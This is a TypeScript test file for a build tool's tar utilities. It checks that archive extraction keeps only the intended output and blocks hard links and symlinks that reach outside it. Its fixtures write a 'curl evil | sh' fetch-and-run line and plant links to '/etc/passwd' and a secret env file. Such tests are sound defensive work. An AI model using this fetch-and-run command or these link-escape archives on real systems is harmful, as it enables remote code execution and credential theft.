import fs, {
  existsSync,
  linkSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readlinkSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'fs'
import { tmpdir } from 'os'
import { basename, join } from 'path'
import { Readable } from 'stream'
import { pipeline } from 'stream/promises'
import { extract } from 'tar'
import { extractOutput, measureArchive, onlyBelow, packArchive } from './tar'

describe('utils/tar', () => {
  let root: string

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'hammerkit-tar-'))
    mkdirSync(join(root, 'source', 'node_modules', 'sub'), { recursive: true })
    for (let i = 0; i < 5; i++) {
      writeFileSync(join(root, 'source', 'node_modules', `file-${i}.js`), `content ${i}`)
      linkSync(
        join(root, 'source', 'node_modules', `file-${i}.js`),
        join(root, 'source', 'node_modules', `link-${i}.js`)
      )
      linkSync(
        join(root, 'source', 'node_modules', `file-${i}.js`),
        join(root, 'source', 'node_modules', 'sub', `link-${i}.js`)
      )
    }
  })

  afterAll(() => {
    rmSync(root, { recursive: true, force: true })
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('takes the entries of one output only, when it is restored', () => {
    const filter = onlyBelow('dist')
    for (const entry of ['dist', 'dist/', './dist/index.js', 'dist/sub/a.js', 'dist\\win.js']) {
      expect(filter(entry), entry).toBe(true)
    }
    for (const entry of ['build.sh', 'dist-other/a.js', 'distx', 'dist/../build.sh', 'src/dist/a.js', '../dist/a.js']) {
      expect(filter(entry), entry).toBe(false)
    }
    expect(onlyBelow('coverage/lcov.info')('coverage/lcov.info')).toBe(true)
    expect(onlyBelow('coverage/lcov.info')('coverage/other.info')).toBe(false)
    // an output that is the folder itself
    for (const output of ['', '.']) {
      expect(onlyBelow(output)('dist/a.js')).toBe(true)
      expect(onlyBelow(output)('../a.js')).toBe(false)
    }
  })

  it('restores no link of an output that reaches beside it', async () => {
    if (process.platform === 'win32') {
      return
    }
    const crafted = join(root, 'crafted')
    mkdirSync(join(crafted, 'dist'), { recursive: true })
    writeFileSync(join(crafted, 'build.sh'), 'curl evil | sh')
    writeFileSync(join(crafted, 'dist', 'index.js'), 'the output')
    linkSync(join(crafted, 'build.sh'), join(crafted, 'dist', 'hard-out'))
    linkSync(join(crafted, 'dist', 'index.js'), join(crafted, 'dist', 'hard-in'))
    symlinkSync('../build.sh', join(crafted, 'dist', 'soft-out'))
    symlinkSync('/etc/passwd', join(crafted, 'dist', 'soft-absolute'))
    symlinkSync('index.js', join(crafted, 'dist', 'soft-in'))
    const file = join(root, 'crafted.tgz')
    // build.sh first, so that dist/hard-out is packed as a link to it
    await packArchive({ cwd: crafted, gzip: true, file }, ['build.sh', 'dist'])

    for (const hosted of [true, false]) {
      const project = join(root, `project-${hosted}`)
      mkdirSync(project)
      writeFileSync(join(project, 'build.sh'), 'the build script')
      await extractOutput(file, project, 'dist', hosted)
      expect(readFileSync(join(project, 'build.sh'), 'utf8')).toBe('the build script')
      expect(statSync(join(project, 'build.sh')).nlink).toBe(1)
      expect(existsSync(join(project, 'dist', 'hard-out'))).toBe(false)
      expect(statSync(join(project, 'dist', 'hard-in')).ino).toBe(statSync(join(project, 'dist', 'index.js')).ino)
      expect(readlinkSync(join(project, 'dist', 'soft-in'))).toBe('index.js')
      // on a machine a link may point out of the output, on a server it is left out
      for (const name of ['soft-out', 'soft-absolute']) {
        const restored = lstatSync(join(project, 'dist', name), { throwIfNoEntry: false })
        expect(restored?.isSymbolicLink() ?? false, `${name} hosted ${hosted}`).toBe(!hosted)
      }
    }
  })

  // what `remote artifacts` takes from a server: an output, unpacked on the machine of the caller
  it('refuses every link that reaches out of a downloaded output', async () => {
    if (process.platform === 'win32') {
      return
    }
    const served = join(root, 'served')
    mkdirSync(join(served, 'app', 'screenshots'), { recursive: true })
    writeFileSync(join(served, 'secret.env'), 'TOKEN=1')
    writeFileSync(join(served, 'app', 'screenshots', 'a.png'), 'shot')
    linkSync(join(served, 'secret.env'), join(served, 'app', 'screenshots', 'hard-out'))
    symlinkSync('../../secret.env', join(served, 'app', 'screenshots', 'soft-out'))
    symlinkSync('/etc/passwd', join(served, 'app', 'screenshots', 'soft-absolute'))
    symlinkSync('a.png', join(served, 'app', 'screenshots', 'soft-in'))
    const file = join(root, 'served.tgz')
    // secret.env first, so that the hard link is packed as a link to it
    await packArchive({ cwd: served, gzip: true, file }, ['secret.env', 'app/screenshots'])

    const download = join(root, 'download')
    mkdirSync(download)
    await extractOutput(file, download, 'app/screenshots', true)
    expect(existsSync(join(download, 'app', 'screenshots', 'a.png'))).toBe(true)
    expect(existsSync(join(download, 'app', 'screenshots', 'hard-out'))).toBe(false)
    expect(existsSync(join(download, 'secret.env'))).toBe(false)
    expect(lstatSync(join(download, 'app', 'screenshots', 'soft-out'), { throwIfNoEntry: false })).toBeUndefined()
    expect(lstatSync(join(download, 'app', 'screenshots', 'soft-absolute'), { throwIfNoEntry: false })).toBeUndefined()
    expect(readlinkSync(join(download, 'app', 'screenshots', 'soft-in'))).toBe('a.png')
  })

  it('measures an archive by its entries and the bytes of their content, before it is unpacked', async () => {
    const file = join(root, 'measured.tgz')
    await packArchive({ cwd: join(root, 'source'), gzip: true, file }, ['node_modules'])
    // node_modules and sub, five files, and five links to each of them in each folder
    expect(await measureArchive(file)).toEqual({ entries: 17, bytes: 5 * 'content 0'.length })
  })

  function expectRestored(dir: string): void {
    for (let i = 0; i < 5; i++) {
      for (const path of [`file-${i}.js`, `link-${i}.js`, join('sub', `link-${i}.js`)]) {
        expect(readFileSync(join(dir, 'node_modules', path), 'utf8')).toBe(`content ${i}`)
      }
      // links are kept where the file id is exact (see packArchive), on Windows not always
      if (Number.isSafeInteger(statSync(join(root, 'source', 'node_modules', `file-${i}.js`)).ino)) {
        const file = statSync(join(dir, 'node_modules', `file-${i}.js`))
        expect(file.nlink).toBe(3)
        expect(statSync(join(dir, 'node_modules', `link-${i}.js`)).ino).toBe(file.ino)
        expect(statSync(join(dir, 'node_modules', 'sub', `link-${i}.js`)).ino).toBe(file.ino)
      }
    }
  }

  // node-tar 7.5.14 and later hang on a directory with several hard links, or fail with
  // "write after end", when they read more than one file at a time
  it('packs a directory with several hard links into a stream', async () => {
    for (let i = 0; i < 10; i++) {
      const target = join(root, `stream-${i}`)
      mkdirSync(target)
      await pipeline(
        Readable.from(packArchive({ cwd: join(root, 'source'), gzip: true }, ['node_modules'])),
        extract({ cwd: target })
      )
      expectRestored(target)
    }
  }, 10000)

  it('packs a directory with several hard links into a file', async () => {
    for (let i = 0; i < 10; i++) {
      const file = join(root, `archive-${i}.tar`)
      const target = join(root, `file-${i}`)
      mkdirSync(target)
      await packArchive({ file, cwd: join(root, 'source'), portable: true, noMtime: true }, ['node_modules'])
      await extract({ file, cwd: target })
      expectRestored(target)
    }
  }, 10000)

  it('packs files in full whose id may be rounded, as on Windows', async () => {
    // a 64-bit file id above 2^53 comes out of Node rounded, so two link groups can share it
    const lstat = fs.lstat
    vi.spyOn(fs, 'lstat').mockImplementation(((path: string, callback: (err: Error | null, stat?: fs.Stats) => void) =>
      lstat(path, (err, stat) => {
        if (stat && /^(file|link)-[01]\.js$/.test(basename(path))) {
          Object.defineProperty(stat, 'ino', { value: 2 ** 60 })
        }
        callback(err, stat)
      })) as typeof fs.lstat)

    const target = join(root, 'rounded')
    mkdirSync(target)
    await pipeline(
      Readable.from(packArchive({ cwd: join(root, 'source') }, ['node_modules'])),
      extract({ cwd: target })
    )
    for (let i = 0; i < 5; i++) {
      for (const path of [`file-${i}.js`, `link-${i}.js`, join('sub', `link-${i}.js`)]) {
        expect(readFileSync(join(target, 'node_modules', path), 'utf8')).toBe(`content ${i}`)
      }
    }
    expect(statSync(join(target, 'node_modules', 'file-1.js')).nlink).toBe(1)
  })

  // node-tar ends the archive a second time ("write after end", thrown in an fs callback)
  // when the last file it packs is empty and its other links are not in the archive yet
  describe('an empty file with more than one link, packed last', () => {
    let errors: Error[]
    const onError = (error: Error) => errors.push(error)

    beforeEach(() => {
      errors = []
      process.prependListener('uncaughtException', onError)
    })

    afterEach(() => {
      process.removeListener('uncaughtException', onError)
    })

    async function packEmpty(cwd: string, file: string, gzip = false): Promise<string> {
      const target = mkdtempSync(join(root, 'empty-'))
      await pipeline(Readable.from(packArchive({ cwd, gzip }, [file])), extract({ cwd: target }))
      // the second end is thrown in the stat callback, outside the pipeline; wait a little so
      // a slower platform can't miss it
      await new Promise((resolve) => setTimeout(resolve, 50))
      return target
    }

    it('packs it when its other link is outside the packed directory, as in a pnpm node_modules', async () => {
      mkdirSync(join(root, 'store'), { recursive: true })
      mkdirSync(join(root, 'project', 'node_modules'), { recursive: true })
      writeFileSync(join(root, 'store', 'empty.js'), '')
      linkSync(join(root, 'store', 'empty.js'), join(root, 'project', 'node_modules', 'empty.js'))

      // with gzip, the second end is a zlib stream error instead
      for (const gzip of [false, true]) {
        for (let i = 0; i < 5; i++) {
          const target = await packEmpty(join(root, 'project'), 'node_modules', gzip)
          expect(readFileSync(join(target, 'node_modules', 'empty.js'), 'utf8')).toBe('')
        }
      }
      expect(errors).toEqual([])
    })

    it('packs it when its id may be rounded, as on Windows', async () => {
      mkdirSync(join(root, 'empty-links'), { recursive: true })
      writeFileSync(join(root, 'empty-links', 'empty.js'), '')
      linkSync(join(root, 'empty-links', 'empty.js'), join(root, 'empty-links', 'linked.js'))
      const lstat = fs.lstat
      vi.spyOn(fs, 'lstat').mockImplementation(((
        path: string,
        callback: (err: Error | null, stat?: fs.Stats) => void
      ) =>
        lstat(path, (err, stat) => {
          if (stat && stat.isFile()) {
            Object.defineProperty(stat, 'ino', { value: 2 ** 60 })
          }
          callback(err, stat)
        })) as typeof fs.lstat)

      for (let i = 0; i < 5; i++) {
        const target = await packEmpty(root, 'empty-links')
        expect(readFileSync(join(target, 'empty-links', 'empty.js'), 'utf8')).toBe('')
        expect(readFileSync(join(target, 'empty-links', 'linked.js'), 'utf8')).toBe('')
      }
      expect(errors).toEqual([])
    })
  })
})
